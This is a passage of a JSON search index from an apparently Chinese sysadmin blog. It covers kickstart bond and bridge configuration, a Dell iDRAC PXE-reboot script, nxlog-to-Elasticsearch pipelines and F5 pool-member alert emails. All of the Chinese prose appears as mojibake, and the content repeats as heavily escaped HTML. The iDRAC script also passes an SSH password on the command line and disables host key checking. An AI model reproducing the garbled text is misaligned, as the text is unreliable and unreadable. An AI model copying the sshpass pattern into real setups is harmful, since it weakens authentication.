class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-bond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eMASTER\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eSLAVE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;br0\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eMASTER\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eSLAVE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;br0\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e %end\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼Œå®‰è£…åŒ…å¿…é¡»å®‰è£…bridge-utilsï¼Œå¦åˆ™æ²¡æœ‰brctlï¼Œæ— æ³•å¯åŠ¨br0ã€‚\u003c/p\u003e","title":"kickstartå®‰è£…è„šæœ¬ä¸­å¦‚ä½•åŒæ—¶é…ç½®bridgeå’Œbond"},{"content":"ç”¨Dell idracçš„è„šæœ¬æ¥ä½¿æœåŠ¡å™¨è¿›å…¥å•æ¬¡pxeå®‰è£…è¿›ç¨‹ã€‚\nè„šæœ¬å¦‚ä¸‹ï¼š\nsshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.BootOnce 1 sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.FirstBootDevice PXE sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm serveraction powercycle ","permalink":"https://rendoumi.com/posts/20240118-idrac_pxe/","summary":"\u003cp\u003eç”¨Dell idracçš„è„šæœ¬æ¥ä½¿æœåŠ¡å™¨è¿›å…¥å•æ¬¡pxeå®‰è£…è¿›ç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eè„šæœ¬å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e iDRAC.ServerBoot.BootOnce \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e iDRAC.ServerBoot.FirstBootDevice PXE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm serveraction powercycle  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Dell idrac é‡å¯æœºå™¨è¿›å…¥å•æ¬¡pxeå®‰è£…"},{"content":"å…¶å®rsyslogã€syslog-ngã€nxlogè¿™ä¸‰ç§ä¸œè¥¿çœŸçš„æ˜¯éƒ½å·®ä¸å¤šã€‚éšä¾¿é€‰ä¸€ä¸ªç”¨éƒ½æ²¡é—®é¢˜ã€‚\næ¯”è¾ƒå–œæ¬¢nxlogçš„routeå’Œjsonä»¥åŠç®­å¤´çš„åŠŸèƒ½ï¼Œå¾ˆç®€æ´ï¼Œæ‰€ä»¥ç”¨å®ƒæ¥æ¨æ•°æ®åˆ°elasticsearch\næ–¹æ³•ä¸€ã€ç”¨om_elasticsearchæ¨ï¼š ... \u0026lt;Input in\u0026gt; Module im_tcp Host 0.0.0.0 Port 1514 InputType Binary \u0026lt;/Input\u0026gt; \u0026lt;Output es\u0026gt; Module om_elasticsearch URL http://localhost:9200/_bulk FlushInterval 2 FlushLimit 100 # Create an index daily Index strftime($EventTime, \u0026#34;nxlog-%Y%m%d\u0026#34;) IndexType \u0026#34;My logs\u0026#34; # Use the following if you don\u0026#39;t have $EventTime set #Index strftime(now(),\u0026#34;nxlog-%Y%m%d\u0026#34;) \u0026lt;/Output\u0026gt; \u0026lt;Route r\u0026gt; Path in =\u0026gt; es \u0026lt;/Route\u0026gt; ... æ–¹æ³•äºŒã€ç”¨om_httpæ¨ï¼š ... \u0026lt;Output elasticsearch\u0026gt; Module om_http URL http://elasticsearch:9200 ContentType application/json Exec set_http_request_path(strftime($EventTime, \u0026#34;/nxlog-%Y%m%d/\u0026#34; + $SourceModuleName)); rename_field(\u0026#34;timestamp\u0026#34;,\u0026#34;@timestamp\u0026#34;); to_json(); \u0026lt;/Output\u0026gt; ... æˆ‘ä»¬ç”Ÿäº§ä¸Šæ˜¯å°†å„ä¸ªæœºå™¨ä¸Šçš„æ—¥å¿—é€šè¿‡rsyslogå‘åˆ°nxlogï¼Œå†ç”±nxlogå¯¼å…¥elasticsearchï¼Œç„¶åç”¨kinabaçœ‹ã€‚\njsonåŒ–çš„F5æ—¥å¿—å¦‚ä¸‹ï¼š\n{ \u0026#34;MessageSourceAddress\u0026#34;:\u0026#34;172.1.2.2\u0026#34;, \u0026#34;EventReceivedTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, \u0026#34;SourceModuleName\u0026#34;:\u0026#34;in_udp\u0026#34;, \u0026#34;SourceModuleType\u0026#34;:\u0026#34;im_udp\u0026#34;, \u0026#34;SyslogFacilityValue\u0026#34;:22, \u0026#34;SyslogFacility\u0026#34;:\u0026#34;LOCAL6\u0026#34;, \u0026#34;SyslogSeverityValue\u0026#34;:6, \u0026#34;SyslogSeverity\u0026#34;:\u0026#34;INFO\u0026#34;, \u0026#34;SeverityValue\u0026#34;:2, \u0026#34;Severity\u0026#34;:\u0026#34;INFO\u0026#34;, \u0026#34;Hostname\u0026#34;:\u0026#34;www\u0026#34;, \u0026#34;EventTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, \u0026#34;Message\u0026#34;:\u0026#34;info logger: [ssl_req][02/Jun/2016:14:04:07 +0800] 127.0.0.1 TLSv1 AES256-SHA \\\u0026#34;/iControl/iControlPortal.cgi\\\u0026#34; 656\u0026#34; } nxlogçš„é…ç½®å¦‚ä¸‹ï¼š ... \u0026lt;Extension json\u0026gt; Module xm_json \u0026lt;/Extension\u0026gt; \u0026lt;Input in_udp\u0026gt; Module im_udp Host 0.0.0.0 Port 514 Exec parse_syslog(); to_json(); \u0026lt;/Input\u0026gt; \u0026lt;Output nxlog_out\u0026gt; Module om_file File \u0026#34;/var/log/nxlog/nxlog.out\u0026#34; \u0026lt;/Output\u0026gt; \u0026lt;Processor buffer_udp\u0026gt; Module pm_buffer # 1Mb buffer MaxSize 1024 Type Mem # warn at 512k WarnLimit 512 \u0026lt;/Processor\u0026gt; ... \u0026lt;Output elasticsearch\u0026gt; Module om_http URL http://localhost:9200 ContentType application/json Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); Exec delete($EventReceivedTime); Exec delete($SourceModuleName); Exec delete($SourceModuleType); Exec delete($SyslogFacilityValue); Exec delete($SyslogFacility); Exec delete($SyslogSeverityValue); #Exec delete($SyslogSeverity); Exec delete($SeverityValue); Exec delete($Severity); Exec $type=\u0026#34;F5-Log\u0026#34;; Exec $t=strftime($EventTime, \u0026#34;%Y-%m-%dT%H:%M:%S%z\u0026#34;); Exec rename_field(\u0026#34;t\u0026#34;,\u0026#34;@timestamp\u0026#34;); Exec to_json(); \u0026lt;/Output\u0026gt; \u0026lt;Route udp\u0026gt; Path in_udp =\u0026gt; buffer_udp =\u0026gt; nxlog_out =\u0026gt; elasticsearch \u0026lt;/Route\u0026gt; æ³¨æ„æˆ‘ä»¬åœ¨in_udpçš„æ—¶å€™å°±å·²ç»æŠŠæ•°æ®å˜æˆäº†jsonï¼Œéšåå‘åˆ°buffer_udpï¼Œç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„ä½œç”¨æ˜¯å½“elasticsearchåäº†éœ€è¦é‡å¯çš„æ—¶å€™ï¼Œæ•°æ®ä¼šå…ˆæ”¾åˆ°bufferï¼Œå½“å¥½äº†çš„æ—¶å€™é‡å‘ã€‚\nnxlog_outæ˜¯ä¸ºäº†æŸ¥çœ‹åˆ°åº•é€è¿‡æ¥ä»€ä¹ˆå­—æ®µï¼Œæˆ‘ä»¬å¥½è°ƒè¯•ã€‚å®é™…ç”Ÿäº§ä¸­ï¼Œçœ‹åˆ°ä¸€æ¡æ•°æ®å°±å¤Ÿäº†ã€‚ç„¶åå°±å¯ä»¥åˆ é™¤è¿™ä¸ªrouteã€‚\nelasticsearchä¸­ï¼Œæˆ‘ä»¬åˆ å»äº†æ— ç”¨çš„åºŸç‰©å­—æ®µã€‚åŠ ä¸Šäº†typeå’Œ@timestampï¼Œå¦‚æœä¸åŠ , kibanaæ— æ³•åˆ¤æ–­ã€‚\næ‰€ä»¥å¦‚ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç›´é€jsonæ•°æ®åˆ°Elasticsearchï¼Œç„¶åå†grafanaæ˜¾ç¤ºå‡ºæ¥ã€‚\n","permalink":"https://rendoumi.com/posts/20240118-nxlog_es/","summary":"\u003cp\u003eå…¶å®rsyslogã€syslog-ngã€nxlogè¿™ä¸‰ç§ä¸œè¥¿çœŸçš„æ˜¯éƒ½å·®ä¸å¤šã€‚éšä¾¿é€‰ä¸€ä¸ªç”¨éƒ½æ²¡é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eæ¯”è¾ƒå–œæ¬¢nxlogçš„routeå’Œjsonä»¥åŠç®­å¤´çš„åŠŸèƒ½ï¼Œå¾ˆç®€æ´ï¼Œæ‰€ä»¥ç”¨å®ƒæ¥æ¨æ•°æ®åˆ°elasticsearch\u003c/p\u003e\n\u003ch5 id=\"æ–¹æ³•ä¸€ç”¨om_elasticsearchæ¨\"\u003eæ–¹æ³•ä¸€ã€ç”¨om_elasticsearchæ¨ï¼š\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Input in\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Module im_tcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Host 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Port \u003cspan class=\"m\"\u003e1514\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        InputType Binary\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Input\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Output es\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Module om_elasticsearch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        URL http://localhost:9200/_bulk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        FlushInterval \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        FlushLimit \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Create an index daily\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Index strftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$EventTime\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;nxlog-%Y%m%d\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        IndexType \u003cspan class=\"s2\"\u003e\u0026#34;My logs\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Use the following if you don\u0026#39;t have $EventTime set\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e#Index strftime(now(),\u0026#34;nxlog-%Y%m%d\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Output\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Route r\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Path \u003cspan class=\"nv\"\u003ein\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; es\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Route\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"æ–¹æ³•äºŒç”¨om_httpæ¨\"\u003eæ–¹æ³•äºŒã€ç”¨om_httpæ¨ï¼š\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Output elasticsearch\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Module      om_http\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    URL         http://elasticsearch:9200\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ContentType application/json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Exec        set_http_request_path\u003cspan class=\"o\"\u003e(\u003c/span\u003estrftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$EventTime\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;/nxlog-%Y%m%d/\u0026#34;\u003c/span\u003e + \u003cspan class=\"nv\"\u003e$SourceModuleName\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e rename_field\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;timestamp\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;@timestamp\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e to_json\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Output\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬ç”Ÿäº§ä¸Šæ˜¯å°†å„ä¸ªæœºå™¨ä¸Šçš„æ—¥å¿—é€šè¿‡rsyslogå‘åˆ°nxlogï¼Œå†ç”±nxlogå¯¼å…¥elasticsearchï¼Œç„¶åç”¨kinabaçœ‹ã€‚\u003c/p\u003e","title":"nxlogæ¨é€æ•°æ®åˆ°elasticsearch"},{"content":"F5-Bigipè´Ÿè½½å‡è¡¡è®¾å¤‡ï¼Œåœ¨æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒï¼Œç”¨äºåˆ†å‘å‰ç«¯çš„è¯·æ±‚ï¼Œå¦‚æœåç«¯çš„æˆå‘˜ç¦»çº¿äº†ï¼Œéœ€è¦åŠæ—¶å¾—åˆ°é€šçŸ¥ã€‚\nè§„åˆ™æ˜¯ï¼šload balanceæ± å­é‡Œçš„æˆå‘˜å¦‚æœç¦»çº¿ï¼Œå°±å‘é€å‘Šè­¦é‚®ä»¶ï¼Œå¦‚æœåˆæ¢å¤äº†ï¼Œä¹Ÿå‘å‘Šè­¦é‚®ä»¶ã€‚\né¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä¸€ä¸ªé‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯qqçš„ä¼ä¸šé‚®ç®±ï¼Œå¦‚ä½•è®¾ç½®åœ¨ä¹‹å‰è¯´è¿‡ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯å†…ç½‘ç”¨è¿™å°æœåŠ¡å™¨å‘é‚®ä»¶ä¸éœ€è¦éªŒè¯ï¼Œä½†æ˜¯å‘é€è€…å¿…é¡»æ˜¯monit@company.comã€‚\nå…ˆæ¥ç¡®è®¤f5çš„ç‰ˆæœ¬ï¼Œä¸åŒçš„ç‰ˆæœ¬ä¸ä¸€å®šé€šç”¨æ’’ã€‚è¿™é‡Œç‰ˆæœ¬æ˜¯11.5.3æ‰å¯ä»¥ã€‚\nç™»å½•F5(ipæ˜¯172.16.0.1)ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ï¼Œæ˜¯ä¸æ˜¯11.5.3\n$ ssh user@172.16.0.1 # tmsh show /sys version ... Product BIG-IP Version 11.5.3 ... # quit ç¼–è¾‘/etc/ssmtp/ssmtp.confï¼Œè®¾ç½®é‚®ä»¶æœåŠ¡å™¨\n# vi /etc/ssmtp/ssmtp.conf mailhub=192.168.0.1 # å¦‚æœæ²¡æœ‰å®‰è£…å†…ç½‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®ã€‚å®‰è£…äº†å°±ä¸ç”¨è®¾ FromLineOverride=YES UseTLS=yes AuthUser=smtp_account AuthPass=password è®¾ç½®å‘Šè­¦å†…å®¹ï¼š\nalert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status down.\u0026#34; { email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; fromaddress=\u0026#34;monit@company.com\u0026#34; body=\u0026#34;A pool member went down\u0026#34; } alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status up.\u0026#34; { email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; fromaddress=\u0026#34;monit@company.com\u0026#34; body=\u0026#34;A pool member went up\u0026#34; } okï¼Œæå®šã€‚ä¸ç”¨é‡å¯ä»€ä¹ˆçš„å•Šï¼Œå³æ—¶ç”Ÿæ•ˆã€‚\n","permalink":"https://rendoumi.com/posts/20240118-f5_alert/","summary":"\u003cp\u003eF5-Bigipè´Ÿè½½å‡è¡¡è®¾å¤‡ï¼Œåœ¨æˆ‘ä»¬çš„ç”Ÿäº§ç¯å¢ƒï¼Œç”¨äºåˆ†å‘å‰ç«¯çš„è¯·æ±‚ï¼Œå¦‚æœåç«¯çš„æˆå‘˜ç¦»çº¿äº†ï¼Œéœ€è¦åŠæ—¶å¾—åˆ°é€šçŸ¥ã€‚\u003c/p\u003e\n\u003cp\u003eè§„åˆ™æ˜¯ï¼šload balanceæ± å­é‡Œçš„æˆå‘˜å¦‚æœç¦»çº¿ï¼Œå°±å‘é€å‘Šè­¦é‚®ä»¶ï¼Œå¦‚æœåˆæ¢å¤äº†ï¼Œä¹Ÿå‘å‘Šè­¦é‚®ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬éœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä¸€ä¸ªé‚®ä»¶å‘é€æœåŠ¡å™¨ï¼Œæˆ‘ä»¬ç”¨çš„æ˜¯qqçš„ä¼ä¸šé‚®ç®±ï¼Œå¦‚ä½•è®¾ç½®åœ¨ä¹‹å‰è¯´è¿‡ï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯å†…ç½‘ç”¨è¿™å°æœåŠ¡å™¨å‘é‚®ä»¶ä¸éœ€è¦éªŒè¯ï¼Œä½†æ˜¯å‘é€è€…å¿…é¡»æ˜¯monit@company.comã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆæ¥ç¡®è®¤f5çš„ç‰ˆæœ¬ï¼Œä¸åŒçš„ç‰ˆæœ¬ä¸ä¸€å®šé€šç”¨æ’’ã€‚è¿™é‡Œç‰ˆæœ¬æ˜¯11.5.3æ‰å¯ä»¥ã€‚\u003c/p\u003e\n\u003cp\u003eç™»å½•F5(ipæ˜¯172.16.0.1)ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ï¼Œæ˜¯ä¸æ˜¯11.5.3\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ssh user@172.16.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# tmsh show /sys version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Product  BIG-IP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Version  11.5.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç¼–è¾‘/etc/ssmtp/ssmtp.confï¼Œè®¾ç½®é‚®ä»¶æœåŠ¡å™¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/ssmtp/ssmtp.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 